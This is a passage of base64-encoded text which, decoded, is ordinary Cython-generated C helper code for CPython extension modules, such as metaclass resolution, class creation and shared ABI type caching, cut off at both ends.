jb2RlX0Zyb21TdHJpbmcobW9kdWxlX25hbWVfc3RyKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfbmFtZSkpIHsgZ290byBtb2RiYWQ7IH1cbiAgICAgICAgbW9kdWxlX2RvdCA9IFB5VW5pY29kZV9Db25jYXQobW9kdWxlX25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE0KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfZG90KSkgeyBnb3RvIG1vZGJhZDsgfVxuICAgICAgICBmdWxsX25hbWUgPSBQeVVuaWNvZGVfQ29uY2F0KG1vZHVsZV9kb3QsIG5hbWUpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWZ1bGxfbmFtZSkpIHsgZ290byBtb2RiYWQ7IH1cbiAgICAgICAgI2lmIChDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlQWV9WRVJTSU9OX05VTSAgPCAweDA3MDMwNDAwKSB8fFxcXG4gICAgICAgICAgICAgICAgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTFxuICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqbW9kdWxlcyA9IFB5SW1wb3J0X0dldE1vZHVsZURpY3QoKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghbW9kdWxlcykpXG4gICAgICAgICAgICAgICAgZ290byBtb2RiYWQ7XG4gICAgICAgICAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEl0ZW0obW9kdWxlcywgZnVsbF9uYW1lKTtcbiAgICAgICAgfVxuICAgICAgICAjZWxzZVxuICAgICAgICB2YWx1ZSA9IFB5SW1wb3J0X0dldE1vZHVsZShmdWxsX25hbWUpO1xuICAgICAgICAjZW5kaWZcbiAgICAgIG1vZGJhZDpcbiAgICAgICAgUHlfWERFQ1JFRihmdWxsX25hbWUpO1xuICAgICAgICBQeV9YREVDUkVGKG1vZHVsZV9kb3QpO1xuICAgICAgICBQeV9YREVDUkVGKG1vZHVsZV9uYW1lKTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHtcbiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX0ltcG9ydEVycm9yLCAiY2Fubm90IGltcG9ydCBuYW1lICVTIiwgbmFtZSk7XG4gICAgfVxuICAgIHJldHVybiB2YWx1ZTtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TGlzdF9QYWNrKFB5X3NzaXplX3QgbiwgLi4uKSB7XG4gICAgdmFfbGlzdCB2YTtcbiAgICBQeU9iamVjdCAqbCA9IFB5TGlzdF9OZXcobik7XG4gICAgdmFfc3RhcnQodmEsIG4pO1xuICAgIGlmICh1bmxpa2VseSghbCkpIGdvdG8gZW5kO1xuICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGk8bjsgKytpKSB7XG4gICAgICAgIFB5T2JqZWN0ICphcmcgPSB2YV9hcmcodmEsIFB5T2JqZWN0Kik7XG4gICAgICAgIFB5X0lOQ1JFRihhcmcpO1xuICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKGwsIGksIGFyZykgIT0gKDApKSB7XG4gICAgICAgICAgICBQeV9DTEVBUihsKTtcbiAgICAgICAgICAgIGdvdG8gZW5kO1xuICAgICAgICB9XG4gICAgfVxuICAgIGVuZDpcbiAgICB2YV9lbmQodmEpO1xuICAgIHJldHVybiBsO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ2FsY3VsYXRlTWV0YWNsYXNzKFB5VHlwZU9iamVjdCAqbWV0YWNsYXNzLCBQeU9iamVjdCAqYmFzZXMpIHtcbiAgICBQeV9zc2l6ZV90IGksIG5iYXNlcztcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIG5iYXNlcyA9IFB5VHVwbGVfR0VUX1NJWkUoYmFzZXMpO1xuI2Vsc2VcbiAgICBuYmFzZXMgPSBQeVR1cGxlX1NpemUoYmFzZXMpO1xuICAgIGlmIChuYmFzZXMgPCAwKSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgIGZvciAoaT0wOyBpIDwgbmJhc2VzOyBpKyspIHtcbiAgICAgICAgUHlUeXBlT2JqZWN0ICp0bXB0eXBlO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IFB5VHVwbGVfR0VUX0lURU0oYmFzZXMsIGkpO1xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IFB5VHVwbGVfR2V0SXRlbShiYXNlcywgaSk7XG4gICAgICAgIGlmICghdG1wKSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgICAgICB0bXB0eXBlID0gUHlfVFlQRSh0bXApO1xuICAgICAgICBpZiAoIW1ldGFjbGFzcykge1xuICAgICAgICAgICAgbWV0YWNsYXNzID0gdG1wdHlwZTtcbiAgICAgICAgICAgIGNvbnRpbnVlO1xuICAgICAgICB9XG4gICAgICAgIGlmIChQeVR5cGVfSXNTdWJ0eXBlKG1ldGFjbGFzcywgdG1wdHlwZSkpXG4gICAgICAgICAgICBjb250aW51ZTtcbiAgICAgICAgaWYgKFB5VHlwZV9Jc1N1YnR5cGUodG1wdHlwZSwgbWV0YWNsYXNzKSkge1xuICAgICAgICAgICAgbWV0YWNsYXNzID0gdG1wdHlwZTtcbiAgICAgICAgICAgIGNvbnRpbnVlO1xuICAgICAgICB9XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAibWV0YWNsYXNzIGNvbmZsaWN0OiAiXG4gICAgICAgICAgICAgICAgICAgICAgICAidGhlIG1ldGFjbGFzcyBvZiBhIGRlcml2ZWQgY2xhc3MgIlxuICAgICAgICAgICAgICAgICAgICAgICAgIm11c3QgYmUgYSAobm9uLXN0cmljdCkgc3ViY2xhc3MgIlxuICAgICAgICAgICAgICAgICAgICAgICAgIm9mIHRoZSBtZXRhY2xhc3NlcyBvZiBhbGwgaXRzIGJhc2VzIik7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBpZiAoIW1ldGFjbGFzcykge1xuICAgICAgICBtZXRhY2xhc3MgPSAmUHlUeXBlX1R5cGU7XG4gICAgfVxuICAgIFB5X0lOQ1JFRigoUHlPYmplY3QqKSBtZXRhY2xhc3MpO1xuICAgIHJldHVybiAoUHlPYmplY3QqKSBtZXRhY2xhc3M7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwyQXJncyhQeU9iamVjdCogZnVuY3Rpb24sIFB5T2JqZWN0KiBhcmcxLCBQeU9iamVjdCogYXJnMikge1xuICAgIFB5T2JqZWN0ICphcmdzWzNdID0ge05VTEwsIGFyZzEsIGFyZzJ9O1xuICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jdGlvbiwgYXJncysxLCAyIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5M01ldGFjbGFzc1ByZXBhcmUoUHlPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKmJhc2VzLCBQeU9iamVjdCAqbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICpta3csIFB5T2JqZWN0ICptb2RuYW1lLCBQeU9iamVjdCAqZG9jKSB7XG4gICAgUHlPYmplY3QgKm5zO1xuICAgIGlmIChtZXRhY2xhc3MpIHtcbiAgICAgICAgUHlPYmplY3QgKnByZXAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihtZXRhY2xhc3MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcmVwYXJlKTtcbiAgICAgICAgaWYgKHByZXApIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpwYXJnc1szXSA9IHtOVUxMLCBuYW1lLCBiYXNlc307XG4gICAgICAgICAgICBucyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChwcmVwLCBwYXJncysxLCAyIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBta3cpO1xuICAgICAgICAgICAgUHlfREVDUkVGKHByZXApO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKVxuICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgbnMgPSBQeURpY3RfTmV3KCk7XG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgICBucyA9IFB5RGljdF9OZXcoKTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFucykpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIGlmICh1bmxpa2VseShQeU9iamVjdF9TZXRJdGVtKG5zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbW9kdWxlLCBtb2RuYW1lKSA8IDApKSBnb3RvIGJhZDtcbiAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfU2V0SXRlbShucywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3F1YWxuYW1lLCBxdWFsbmFtZSkgPCAwKSkgZ290byBiYWQ7XG4gICAgaWYgKHVubGlrZWx5KGRvYyAmJiBQeU9iamVjdF9TZXRJdGVtKG5zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZG9jLCBkb2MpIDwgMCkpIGdvdG8gYmFkO1xuICAgIHJldHVybiBucztcbmJhZDpcbiAgICBQeV9ERUNSRUYobnMpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeTNDbGFzc0NyZWF0ZShQeU9iamVjdCAqbWV0YWNsYXNzLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmJhc2VzLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm1rdyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGNhbGN1bGF0ZV9tZXRhY2xhc3MsIGludCBhbGxvd19weTJfbWV0YWNsYXNzKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBQeU9iamVjdCAqb3duZWRfbWV0YWNsYXNzID0gTlVMTDtcbiAgICBQeU9iamVjdCAqbWFyZ3NbNF0gPSB7TlVMTCwgbmFtZSwgYmFzZXMsIGRpY3R9O1xuICAgIGlmIChhbGxvd19weTJfbWV0YWNsYXNzKSB7XG4gICAgICAgIG93bmVkX21ldGFjbGFzcyA9IFB5T2JqZWN0X0dldEl0ZW0oZGljdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21ldGFjbGFzcyk7XG4gICAgICAgIGlmIChvd25lZF9tZXRhY2xhc3MpIHtcbiAgICAgICAgICAgIG1ldGFjbGFzcyA9IG93bmVkX21ldGFjbGFzcztcbiAgICAgICAgfSBlbHNlIGlmIChsaWtlbHkoUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19LZXlFcnJvcikpKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICB9XG4gICAgaWYgKGNhbGN1bGF0ZV9tZXRhY2xhc3MgJiYgKCFtZXRhY2xhc3MgfHwgUHlUeXBlX0NoZWNrKG1ldGFjbGFzcykpKSB7XG4gICAgICAgIG1ldGFjbGFzcyA9IF9fUHl4X0NhbGN1bGF0ZU1ldGFjbGFzcygoUHlUeXBlT2JqZWN0KikgbWV0YWNsYXNzLCBiYXNlcyk7XG4gICAgICAgIFB5X1hERUNSRUYob3duZWRfbWV0YWNsYXNzKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtZXRhY2xhc3MpKVxuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIG93bmVkX21ldGFjbGFzcyA9IG1ldGFjbGFzcztcbiAgICB9XG4gICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KG1ldGFjbGFzcywgbWFyZ3MrMSwgMyB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgbWt3KTtcbiAgICBQeV9YREVDUkVGKG93bmVkX21ldGFjbGFzcyk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlEaWN0X1NldERlZmF1bHQoUHlPYmplY3QgKmQsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICpkZWZhdWx0X3ZhbHVlKSB7XG4gICAgUHlPYmplY3QqIHZhbHVlO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgUHlPYmplY3QgKmFyZ3NbXSA9IHtkLCBrZXksIGRlZmF1bHRfdmFsdWV9O1xuICAgIHZhbHVlID0gUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0ZGVmYXVsdCwgYXJncywgMyB8IFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgTlVMTCk7XG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgdmFsdWUgPSBQeU9iamVjdF9DYWxsTWV0aG9kT2JqQXJncyhkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0ZGVmYXVsdCwga2V5LCBkZWZhdWx0X3ZhbHVlLCBOVUxMKTtcbiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICBQeURpY3RfU2V0RGVmYXVsdFJlZihkLCBrZXksIGRlZmF1bHRfdmFsdWUsICZ2YWx1ZSk7XG4jZWxzZVxuICAgIHZhbHVlID0gUHlEaWN0X1NldERlZmF1bHQoZCwga2V5LCBkZWZhdWx0X3ZhbHVlKTtcbiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgcmV0dXJuIE5VTEw7XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiNlbmRpZlxuICAgIHJldHVybiB2YWx1ZTtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVPYmplY3RSZWYoUHlPYmplY3QgKm5hbWUpIHtcbiAgICAgIFB5T2JqZWN0ICptb2R1bGVfZGljdCA9IFB5SW1wb3J0X0dldE1vZHVsZURpY3QoKTtcbiAgICAgIFB5T2JqZWN0ICptO1xuICAgICAgaWYgKFB5TWFwcGluZ19HZXRPcHRpb25hbEl0ZW0obW9kdWxlX2RpY3QsIG5hbWUsICZtKSA8IDApIHtcbiAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgIH1cbiAgICAgIGlmIChtICE9IE5VTEwgJiYgUHlNb2R1bGVfQ2hlY2sobSkpIHtcbiAgICAgICAgICByZXR1cm4gbTtcbiAgICAgIH1cbiAgICAgIFB5X1hERUNSRUYobSk7XG4gICAgICBtID0gUHlNb2R1bGVfTmV3T2JqZWN0KG5hbWUpO1xuICAgICAgaWYgKG0gPT0gTlVMTClcbiAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgIGlmIChQeURpY3RfQ2hlY2tFeGFjdChtb2R1bGVfZGljdCkpIHtcbiAgICAgICAgICBQeU9iamVjdCAqbmV3X207XG4gICAgICAgICAgKHZvaWQpUHlEaWN0X1NldERlZmF1bHRSZWYobW9kdWxlX2RpY3QsIG5hbWUsIG0sICZuZXdfbSk7XG4gICAgICAgICAgUHlfREVDUkVGKG0pO1xuICAgICAgICAgIHJldHVybiBuZXdfbTtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgIGlmIChQeU9iamVjdF9TZXRJdGVtKG1vZHVsZV9kaWN0LCBuYW1lLCBtKSAhPSAwKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKG0pO1xuICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuIG07XG4gICAgICB9XG4gIH1cbiAgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoY29uc3QgY2hhciAqbmFtZSkge1xuICAgICAgUHlPYmplY3QgKnB5X25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhuYW1lKTtcbiAgICAgIGlmICghcHlfbmFtZSkgcmV0dXJuIE5VTEw7XG4gICAgICBQeU9iamVjdCAqbW9kdWxlID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlT2JqZWN0UmVmKHB5X25hbWUpO1xuICAgICAgUHlfREVDUkVGKHB5X25hbWUpO1xuICAgICAgcmV0dXJuIG1vZHVsZTtcbiAgfVxuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICNkZWZpbmUgX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKG5hbWUpIFB5SW1wb3J0X0FkZE1vZHVsZVJlZihuYW1lKVxuI2Vsc2VcbiAgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoY29uc3QgY2hhciAqbmFtZSkge1xuICAgICAgUHlPYmplY3QgKm1vZHVsZSA9IFB5SW1wb3J0X0FkZE1vZHVsZShuYW1lKTtcbiAgICAgIFB5X1hJTkNSRUYobW9kdWxlKTtcbiAgICAgIHJldHVybiBtb2R1bGU7XG4gIH1cbiNlbmRpZlxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfRmV0Y2hTaGFyZWRDeXRob25BQklNb2R1bGUodm9pZCkge1xuICAgIHJldHVybiBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoX19QWVhfQUJJX01PRFVMRV9OQU1FKTtcbn1cblxuXG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDBcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlUeXBlX0Zyb21NZXRhY2xhc3MoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKG1vZHVsZSwgc3BlYywgYmFzZXMpO1xuICAgIGlmIChyZXN1bHQgJiYgbWV0YWNsYXNzKSB7XG4gICAgICAgIFB5T2JqZWN0ICpvbGRfdHAgPSAoUHlPYmplY3QqKVB5X1RZUEUocmVzdWx0KTtcbiAgICBQeV9JTkNSRUYoKFB5T2JqZWN0KiltZXRhY2xhc3MpO1xuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMFxuICAgICAgICBQeV9TRVRfVFlQRShyZXN1bHQsIG1ldGFjbGFzcyk7XG4jZWxzZVxuICAgICAgICByZXN1bHQtPm9iX3R5cGUgPSBtZXRhY2xhc3M7XG4jZW5kaWZcbiAgICAgICAgUHlfREVDUkVGKG9sZF90cCk7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhtZSwgbW8sIHMsIGIpIFB5VHlwZV9Gcm9tTWV0YWNsYXNzKG1lLCBtbywgcywgYilcbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKFB5T2JqZWN0ICpjYWNoZWRfdHlwZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjaGFyICpuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5X3NzaXplX3QgZXhwZWN0ZWRfYmFzaWNzaXplKSB7XG4gICAgUHlfc3NpemVfdCBiYXNpY3NpemU7XG4gICAgaWYgKCFQeVR5cGVfQ2hlY2soY2FjaGVkX3R5cGUpKSB7XG4gICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAiU2hhcmVkIEN5dGhvbiB0eXBlICUuMjAwcyBpcyBub3QgYSB0eXBlIG9iamVjdCIsIG5hbWUpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIGlmIChleHBlY3RlZF9iYXNpY3NpemUgPT0gMCkge1xuICAgICAgICByZXR1cm4gMDsgLy8gc2l6ZSBpcyBpbmhlcml0ZWQsIG5vdGhpbmcgdXNlZnVsIHRvIGNoZWNrXG4gICAgfVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqcHlfYmFzaWNzaXplO1xuICAgIHB5X2Jhc2ljc2l6ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoY2FjaGVkX3R5cGUsICJfX2Jhc2ljc2l6ZV9fIik7XG4gICAgaWYgKHVubGlrZWx5KCFweV9iYXNpY3NpemUpKSByZXR1cm4gLTE7XG4gICAgYmFzaWNzaXplID0gUHlMb25nX0FzU3NpemVfdChweV9iYXNpY3NpemUpO1xuICAgIFB5X0RFQ1JFRihweV9iYXNpY3NpemUpO1xuICAgIHB5X2Jhc2ljc2l6ZSA9IE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KGJhc2ljc2l6ZSA9PSAoUHlfc3NpemVfdCktMSkgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIC0xO1xuI2Vsc2VcbiAgICBiYXNpY3NpemUgPSAoKFB5VHlwZU9iamVjdCopIGNhY2hlZF90eXBlKS0+dHBfYmFzaWNzaXplO1xuI2VuZGlmXG4gICAgaWYgKGJhc2ljc2l6ZSAhPSBleHBlY3RlZF9iYXNpY3NpemUpIHtcbiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICJTaGFyZWQgQ3l0aG9uIHR5cGUgJS4yMDBzIGhhcyB0aGUgd3Jvbmcgc2l6ZSwgdHJ5IHJlY29tcGlsaW5nIixcbiAgICAgICAgICAgIG5hbWUpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5VHlwZU9iamVjdCAqX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpIHtcbiAgICBQeU9iamVjdCAqYWJpX21vZHVsZSA9IE5VTEwsICpjYWNoZWRfdHlwZSA9IE5VTEwsICphYmlfbW9kdWxlX2RpY3QsICpuZXdfY2FjaGVkX3R5cGUsICpweV9vYmplY3RfbmFtZTtcbiAgICBpbnQgZ2V0X2l0ZW1fcmVmX3Jlc3VsdDtcbiAgICBjb25zdCBjaGFyKiBvYmplY3RfbmFtZSA9IHN0cnJjaHIoc3BlYy0+bmFtZSwgXCcuXCcpO1xuICAgIG9iamVjdF9uYW1lID0gb2JqZWN0X25hbWUgPyBvYmplY3RfbmFtZSsxIDogc3BlYy0+bmFtZTtcbiAgICBweV9vYmplY3RfbmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKG9iamVjdF9uYW1lKTtcbiAgICBpZiAoIXB5X29iamVjdF9uYW1lKSByZXR1cm4gTlVMTDtcbiAgICBhYmlfbW9kdWxlID0gX19QeXhfRmV0Y2hTaGFyZWRDeXRob25BQklNb2R1bGUoKTtcbiAgICBpZiAoIWFiaV9tb2R1bGUpIGdvdG8gZG9uZTtcbiAgICBhYmlfbW9kdWxlX2RpY3QgPSBQeU1vZHVsZV9HZXREaWN0KGFiaV9tb2R1bGUpO1xuICAgIGlmICghYWJpX21vZHVsZV9kaWN0KSBnb3RvIGRvbmU7XG4gICAgZ2V0X2l0ZW1fcmVmX3Jlc3VsdCA9IF9fUHl4X1B5RGljdF9HZXRJdGVtUmVmKGFiaV9tb2R1bGVfZGljdCwgcHlfb2JqZWN0X25hbWUsICZjYWNoZWRfdHlwZSk7XG4gICAgaWYgKGdldF9pdGVtX3JlZl9yZXN1bHQgPT0gMSkge1xuICAgICAgICBpZiAoX19QeXhfVmVyaWZ5Q2FjaGVkVHlwZShcbiAgICAgICAgICAgICAgY2FjaGVkX3R5cGUsXG4gICAgICAgICAgICAgIG9iamVjdF9uYW1lLFxuICAgICAgICAgICAgICBzcGVjLT5iYXNpY3NpemUpIDwgMCkge1xuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgZ290byBkb25lO1xuICAgIH0gZWxzZSBpZiAodW5saWtlbHkoZ2V0X2l0ZW1fcmVmX3Jlc3VsdCA9PSAtMSkpIHtcbiAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgIGNhY2hlZF90eXBlID0gX19QeXhfUHlUeXBlX0Zyb21NZXRhY2xhc3MoXG4gICAgICAgIG1ldGFjbGFzcyxcbiAgICAgICAgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgPyBtb2R1bGUgOiBhYmlfbW9kdWxlLFxuICAgICAgICBzcGVjLCBiYXNlcyk7XG4gICAgaWYgKHVubGlrZWx5KCFjYWNoZWRfdHlwZSkpIGdvdG8gYmFkO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKHNwZWMsIChQeVR5cGVPYmplY3QgKikgY2FjaGVkX3R5cGUpIDwgMCkpIGdvdG8gYmFkO1xuICAgIG5ld19jYWNoZWRfdHlwZSA9IF9fUHl4X1B5RGljdF9TZXREZWZhdWx0KGFiaV9tb2R1bGVfZGljdCwgcHlfb2JqZWN0X25hbWUsIGNhY2hlZF90eXBlKTtcbiAgICBpZiAodW5saWtlbHkobmV3X2NhY2hlZF90eXBlICE9IGNhY2hlZF90eXBlKSkge1xuICAgICAgICBpZiAodW5saWtlbHkoIW5ld19jYWNoZWRfdHlwZSkpIGdvdG8gYmFkO1xuICAgICAgICBQeV9ERUNSRUYoY2FjaGVkX3R5cGUpO1xuICAgICAgICBjYWNoZWRfdHlwZSA9IG5ld19jYWNoZWRfdHlwZTtcbiAgICAgICAgaWYgKF9fUHl4X1ZlcmlmeUNhY2hlZFR5cGUoXG4gICAgICAgICAgICAgICAgY2FjaGVkX3R5cGUsXG4gICAgICAgICAgICAgICAgb2JqZWN0X25hbWUsXG4gICAgICAgICAgICAgICAgc3BlYy0+YmFzaWNzaXplKSA8IDApIHtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gZG9uZTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeV9ERUNSRUYobmV3X2NhY2hlZF90eXBlKTtcbiAgICB9XG5kb25lOlxuICAgIFB5X1hERUNSRUYoYWJpX21vZHVsZSk7XG4gICAgUHlfREVDUkVGKHB5X29iamVjdF9uYW1lKTtcbiAgICBhc3NlcnQoY2FjaGVkX3R5cGUgPT0gTlVMTCB8fCBQeVR5cGVfQ2hlY2soY2FjaGVkX3R5cGUpKTtcbiAgICByZXR1cm4gKFB5VHlwZU9iamVjdCAqKSBjYWNoZWRfdHlwZTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKGNhY2hlZF90eXBlKTtcbiAgICBjYWNoZWRfdHlwZSA9IE5VTEw7XG4gICAgZ290byBkb25lO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCogX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0X21vZHVsZShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpzZWxmLCBDWVRIT05fVU5VU0VEIHZvaWQqIGNvbnRleHQpIHtcbiAgICByZXR1cm4gUHlVbmljb2RlX0Zyb21TdHJpbmcoX19QWVhfQUJJX01PRFVMRV9OQU1FKTtcbn1cbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuc3RhdGljIFB5T2JqZWN0KiBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19jYWxsKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnNlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmFyZ3MsIENZVEhPTl9VTlVTRUQgUHlPYmplY3